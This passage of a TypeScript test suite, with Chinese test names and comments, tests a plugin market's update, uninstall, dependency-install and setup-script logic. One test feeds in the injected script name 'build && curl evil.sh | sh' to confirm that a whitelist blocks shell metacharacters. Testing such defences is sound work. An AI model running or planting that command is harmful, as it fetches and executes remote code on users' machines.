    await mkdir(join(h.pluginsDir, "demo"), { recursive: true })

    expect(await h.market.inspectUpdate("demo")).toEqual({ willPull: false, dirty: false })
  })

  it("工作区干净时不 stash", async () => {
    const git = stubGit({ status: "" })
    const h = await makeHarness({ "https://example.com/index.json": { json: GIT_INDEX } }, {}, undefined, git.run)
    await makeGitRepo(h.pluginsDir)

    await h.market.update("demo")

    expect(git.cmds()).not.toContain("stash")
    expect(h.logger.lines.some(line => line.includes("已暂存"))).toBe(false)
  })

  it("拉取失败时抛错，插件目录原样留下", async () => {
    const git = stubGit({ fail: { cmd: "fetch", message: "无法连接到远端" } })
    const h = await makeHarness({ "https://example.com/index.json": { json: GIT_INDEX } }, {}, undefined, git.run)
    const dir = await makeGitRepo(h.pluginsDir)

    await expect(h.market.update("demo")).rejects.toThrow("无法连接到远端")
    // 退回重装会把一次可修复的网络失败变成一次目录删除
    expect(await isFile(join(dir, "index.js"))).toBe(true)
    expect(await isDirectory(join(dir, "node_modules"))).toBe(true)
    expect(git.cmds()).not.toContain("reset")
  })

  it("minCore 不满足时拒绝，且不退回重装", async () => {
    const git = stubGit()
    const h = await makeHarness(
      { "https://example.com/index.json": { json: { plugins: [{ ...GIT_INDEX.plugins[0], minCore: "9.0.0" }] } } },
      {},
      undefined,
      git.run
    )
    const dir = await makeGitRepo(h.pluginsDir)

    await expect(h.market.update("demo")).rejects.toThrow("要求内核版本不低于 9.0.0")
    expect(await isFile(join(dir, "index.js"))).toBe(true)
    expect(git.cmds()).not.toContain("fetch")
  })

  it("目录不是 git 仓库时退回重装，走 clone", async () => {
    const git = stubGit({
      effect: async args => {
        if (args[0] !== "clone") return
        const dest = args[args.length - 1]!
        await mkdir(dest, { recursive: true })
        await writeFile(join(dest, "package.json"), JSON.stringify({ version: "2.0.0" }), "utf8")
        await writeFile(join(dest, "index.js"), 'export default "v2"', "utf8")
      }
    })
    const h = await makeHarness({ "https://example.com/index.json": { json: GIT_INDEX } }, {}, undefined, git.run)
    // 早先由归档装来的目录：没有 .git，无从拉取
    const dir = join(h.pluginsDir, "demo")
    await mkdir(dir, { recursive: true })
    await writeFile(join(dir, "index.js"), 'export default "v1"', "utf8")

    const result = await h.market.update("demo")

    expect(result).toMatchObject({ via: "git", version: "2.0.0" })
    expect(result.fromVersion).toBeUndefined()
    expect(result.changed).toBeUndefined()
    expect(git.cmds()).toContain("clone")
    expect(git.cmds()).not.toContain("fetch")
    expect(await readFile(join(dir, "index.js"), "utf8")).toBe('export default "v2"')
  })

  it("本机没有 git 时退回重装，走归档", async () => {
    const git = stubGit({ fail: { cmd: "--version", message: "找不到 git" } })
    const h = await makeHarness(
      {
        "https://example.com/index.json": { json: GIT_INDEX },
        [CODELOAD]: { bytes: pluginArchive({ version: "2.0.0" }, "v2") }
      },
      {},
      undefined,
      git.run
    )
    await makeGitRepo(h.pluginsDir)

    const result = await h.market.update("demo")

    expect(result).toMatchObject({ via: "tarball", version: "2.0.0" })
    expect(h.calls).toContain(CODELOAD)
  })

  it("索引声明的来源不是 git 时退回重装", async () => {
    const git = stubGit()
    const h = await makeHarness(
      {
        "https://example.com/index.json": { json: INDEX },
        [TARBALL]: { bytes: pluginArchive({ version: "2.0.0" }, "v2") }
      },
      {},
      undefined,
      git.run
    )
    // 目录里有 .git（使用者自己 clone 的），但索引说这插件由归档分发
    await makeGitRepo(h.pluginsDir)

    const result = await h.market.update("demo")

    expect(result).toMatchObject({ via: "tarball", version: "2.0.0" })
    expect(git.cmds()).not.toContain("fetch")
  })
})

describe("PluginMarket 卸载", () => {
  it("删除插件目录，未安装时返回 false", async () => {
    const h = await makeHarness({ "https://example.com/index.json": { json: INDEX } })
    await mkdir(join(h.pluginsDir, "demo", "lib"), { recursive: true })
    await writeFile(join(h.pluginsDir, "demo", "index.js"), "1", "utf8")

    expect(await h.market.remove("demo")).toBe(true)
    expect(await isDirectory(join(h.pluginsDir, "demo"))).toBe(false)
    expect(await h.market.remove("demo")).toBe(false)
  })

  it("越界名称在删除前即被拒绝", async () => {
    const h = await makeHarness({ "https://example.com/index.json": { json: INDEX } })
    await expect(h.market.remove("../..")).rejects.toThrow("不合法")
  })
})

/** 声明了装后步骤的索引：从源码装、要 build 才有产物的那一类 */
const SETUP_INDEX = {
  plugins: [
    {
      name: "demo",
      title: "示例",
      version: "1.0.0",
      install: { type: "tarball", url: TARBALL },
      setup: { scripts: ["build", "install:browser"] }
    }
  ]
}

describe("装依赖与装后步骤", () => {
  it("不要求时一个包管理器命令都不下发，仅提示需自行安装", async () => {
    const pm = stubPm()
    const h = await makeHarness(
      {
        "https://example.com/index.json": { json: INDEX },
        [TARBALL]: { bytes: pluginArchive({ version: "1.0.0", dependencies: { lodash: "^4" } }) }
      },
      {},
      undefined,
      undefined,
      pm.run
    )

    const result = await h.market.install("demo")

    expect(pm.calls).toEqual([])
    expect(result).toMatchObject({ needsDependencies: true })
    expect(result.installedDeps).toBeUndefined()
    expect(h.logger.lines.some(line => line.includes("声明了运行时依赖"))).toBe(true)
  })

  it("要求时在插件目录内装依赖，缺省不带 devDependencies", async () => {
    const pm = stubPm()
    const h = await makeHarness(
      {
        "https://example.com/index.json": { json: INDEX },
        [TARBALL]: { bytes: pluginArchive({ version: "1.0.0", dependencies: { lodash: "^4" } }) }
      },
      {},
      undefined,
      undefined,
      pm.run
    )

    const result = await h.market.install("demo", { dependencies: true })

    expect(pm.calls).toEqual([{ task: { kind: "install", dev: false }, cwd: join(h.pluginsDir, "demo") }])
    expect(result).toMatchObject({ needsDependencies: false, installedDeps: true, packageManager: "pnpm" })
    // 装成了就不该再提示「需自行安装」——那句话在此处是假的
    expect(h.logger.lines.some(line => line.includes("需在其目录内自行执行"))).toBe(false)
  })

  it("**没声明依赖的插件不跑包管理器**，即便要求了", async () => {
    const pm = stubPm()
    const h = await makeHarness(
      {
        "https://example.com/index.json": { json: INDEX },
        [TARBALL]: { bytes: pluginArchive({ version: "1.0.0" }) }
      },
      {},
      undefined,
      undefined,
      pm.run
    )

    const result = await h.market.install("demo", { dependencies: true })

    // 无依赖可装时跑一趟只是白等一次网络往返
    expect(pm.calls).toEqual([])
    expect(result).toMatchObject({ needsDependencies: false })
  })

  it("声明了装后步骤时连 devDependencies 一起装，再按序跑脚本", async () => {
    const pm = stubPm()
    const h = await makeHarness(
      {
        "https://example.com/index.json": { json: SETUP_INDEX },
        [TARBALL]: { bytes: pluginArchive({ version: "1.0.0", dependencies: { lodash: "^4" } }) }
      },
      {},
      undefined,
      undefined,
      pm.run
    )

    const result = await h.market.install("demo", { dependencies: true })

    /*
     * 这一条钉两件事，错任一件都只在插件加载时才报一条离原因很远的错
     *
     * 一是 `dev: true` —— `build` 要的编译器在 devDependencies 里，`--prod` 装完再跑
     * `build` 会报「找不到 tsc」。二是脚本的**次序**：`install:browser` 建立在 `build` 之后。
     */
    expect(pm.calls.map(item => item.task)).toEqual([
      { kind: "install", dev: true },
      { kind: "run", script: "build" },
      { kind: "run", script: "install:browser" }
    ])
    expect(result.ranScripts).toEqual(["build", "install:browser"])
    expect(result.setupError).toBeUndefined()
  })

  it("**装依赖失败不让整次安装失败**，但脚本一个都不跑", async () => {
    const pm = stubPm({ fail: { at: "install", message: "registry 连不上" } })
    const h = await makeHarness(
      {
        "https://example.com/index.json": { json: SETUP_INDEX },
        [TARBALL]: { bytes: pluginArchive({ version: "1.0.0", dependencies: { lodash: "^4" } }) }
      },
      {},
      undefined,
      undefined,
      pm.run
    )

    const result = await h.market.install("demo", { dependencies: true })

    // 插件目录已经就位，抛出去会让使用者以为「什么都没装成」而去重装
    expect(await isFile(join(h.pluginsDir, "demo", "index.js"))).toBe(true)
    expect(result).toMatchObject({ needsDependencies: true, installedDeps: false })
    expect(result.dependencyError).toContain("registry 连不上")
    // 脚本多半建立在依赖之上，接着跑只会得到第二条更难懂的错误
    expect(pm.calls.map(item => item.task.kind)).toEqual(["install"])
    expect(result.ranScripts).toBeUndefined()
  })

  it("脚本失败即停，已跑完的那些如实记下", async () => {
    const pm = stubPm({ fail: { at: "build", message: "TS2339: 类型上不存在该属性" } })
    const h = await makeHarness(
      {
        "https://example.com/index.json": { json: SETUP_INDEX },
        [TARBALL]: { bytes: pluginArchive({ version: "1.0.0", dependencies: { lodash: "^4" } }) }
      },
      {},
      undefined,
      undefined,
      pm.run
    )

    const result = await h.market.install("demo", { dependencies: true })

    expect(result.ranScripts).toEqual([])
    // 失败在哪个脚本上必须带出来：缺产物与缺依赖的后手完全不同
    expect(result.setupError).toContain("build")
    expect(result.setupError).toContain("TS2339")
    // 依赖是装好的，故这一项为假 —— 与 dependencyError 那条路要分得开
    expect(result).toMatchObject({ needsDependencies: false, installedDeps: true })
    expect(pm.calls.map(item => item.task.kind)).toEqual(["install", "run"])
  })

  it("索引里的 script 名不合法时整条装后步骤丢弃，退回只装依赖", async () => {
    const pm = stubPm()
    const h = await makeHarness(
      {
        "https://example.com/index.json": {
          json: {
            plugins: [
              {
                name: "demo",
                install: { type: "tarball", url: TARBALL },
                // 带 shell 元字符：这一条正是白名单要挡住的东西
                setup: { scripts: ["build && curl evil.sh | sh"] }
              }
            ]
          }
        },
        [TARBALL]: { bytes: pluginArchive({ version: "1.0.0", dependencies: { lodash: "^4" } }) }
      },
      {},
      undefined,
      undefined,
      pm.run
    )

    const result = await h.market.install("demo", { dependencies: true })

    // 一个名字不合法就整条丢弃：过滤后继续会得到一份「跑了一半」的装后步骤
    expect(pm.calls.map(item => item.task)).toEqual([{ kind: "install", dev: false }])
    // 装依赖照跑（那一步与 setup 无关），只是没有任何 script 被执行
    expect(result.ranScripts).toEqual([])
    expect(h.logger.lines.some(line => line.includes("不合法的 script 名"))).toBe(true)
  })

  it("就地拉取没拉到新提交、且依赖不缺时不跑收尾", async () => {
    const pm = stubPm()
    const git = stubGit({ heads: ["1111111aaa"] })
    const h = await makeHarness(
      {
        "https://example.com/index.json": {
          json: { plugins: [{ ...GIT_INDEX.plugins[0], setup: { scripts: ["build"] } }] }
        }
      },
      {},
      undefined,
      git.run,
      pm.run
    )
    await makeGitRepo(h.pluginsDir)

    const result = await h.market.update("demo", { dependencies: true })

    // 什么都没改，重跑 build 只是白等一遍编译
    expect(result.changed).toBe(false)
    expect(pm.calls).toEqual([])
  })

  it("就地拉到新提交时重跑装后步骤，哪怕依赖不缺", async () => {
    const pm = stubPm()
    const git = stubGit()
    const h = await makeHarness(
      {
        "https://example.com/index.json": {
          json: { plugins: [{ ...GIT_INDEX.plugins[0], setup: { scripts: ["build"] } }] }
        }
      },
      {},
      undefined,
      git.run,
      pm.run
    )
    // makeGitRepo 建的目录里已有 node_modules，故依赖不缺
    await makeGitRepo(h.pluginsDir)

    const result = await h.market.update("demo", { dependencies: true })

    /*
     * `dist/` 多半被插件仓库 gitignore 掉了：拉来新提交之后 `node_modules` 还在，
     * 而产物是旧的。此时跳过 build，插件跑的就还是上一版代码，且毫无迹象。
     */
    expect(result.changed).toBe(true)
    expect(pm.calls.map(item => item.task)).toEqual([{ kind: "install", dev: true }, { kind: "run", script: "build" }])
  })
})

describe("PluginMarket.setup", () => {
  it("对已装好的目录重跑，即便依赖不缺也跑一遍", async () => {
    const pm = stubPm()
    const h = await makeHarness(
      { "https://example.com/index.json": { json: SETUP_INDEX } },
      {},
      undefined,
      undefined,
      pm.run
    )
    const dir = join(h.pluginsDir, "demo")
    await mkdir(join(dir, "node_modules"), { recursive: true })
    await writeFile(join(dir, "package.json"), JSON.stringify({ version: "1.2.3", dependencies: { lodash: "^4" } }), "utf8")

    const result = await h.market.setup("demo")

    /*
     * 使用者点这个按钮，多半正是因为 package.json 的依赖变过而 node_modules 是旧的
     *
     * 那种「旧」从目录存不存在上看不出来，而包管理器自己比对 lock 文件本就是幂等的。
     */
    expect(pm.calls.map(item => item.task)).toEqual([
      { kind: "install", dev: true },
      { kind: "run", script: "build" },
      { kind: "run", script: "install:browser" }
    ])
    expect(result).toMatchObject({ name: "demo", dir, version: "1.2.3", installedDeps: true })
  })

  it("索引里没有这个插件也照做，只是不跑装后步骤", async () => {
    const pm = stubPm()
    const h = await makeHarness(
      { "https://example.com/index.json": { json: INDEX } },
      {},
      undefined,
      undefined,
      pm.run
    )
    // 手工放进插件目录的插件：不在任何索引里
    const dir = join(h.pluginsDir, "handmade")
    await mkdir(dir, { recursive: true })
    await writeFile(join(dir, "package.json"), JSON.stringify({ version: "0.1.0", dependencies: { lodash: "^4" } }), "utf8")

    const result = await h.market.setup("handmade")

    // 拿不到条目就拒绝，会让这个按钮恰在最需要它的场合失效
    expect(pm.calls.map(item => item.task)).toEqual([{ kind: "install", dev: false }])
    expect(result).toMatchObject({ installedDeps: true, needsDependencies: false })
  })

  it("目录不存在时抛错，越界名称在此之前即被拒绝", async () => {
    const h = await makeHarness({ "https://example.com/index.json": { json: INDEX } })

    await expect(h.market.setup("nothere")).rejects.toThrow("不存在")
    await expect(h.market.setup("../..")).rejects.toThrow("不合法")
  })

  it("没有 package.json 的插件不跑包管理器", async () => {
    const pm = stubPm()
    const h = await makeHarness(
      { "https://example.com/index.json": { json: INDEX } },
      {},
      undefined,
      undefined,
      pm.run
    )
    const dir = join(h.pluginsDir, "demo")
    await mkdir(dir, { recursive: true })
    await writeFile(join(dir, "index.js"), "export default 1", "utf8")

    const result = await h.market.setup("demo")

    // 单文件插件没有依赖可言，跑一趟只会在一个没有 package.json 的目录里报错
    expect(pm.calls).toEqual([])
    expect(result).toMatchObject({ needsDependencies: false, version: "0.0.0" })
  })
})
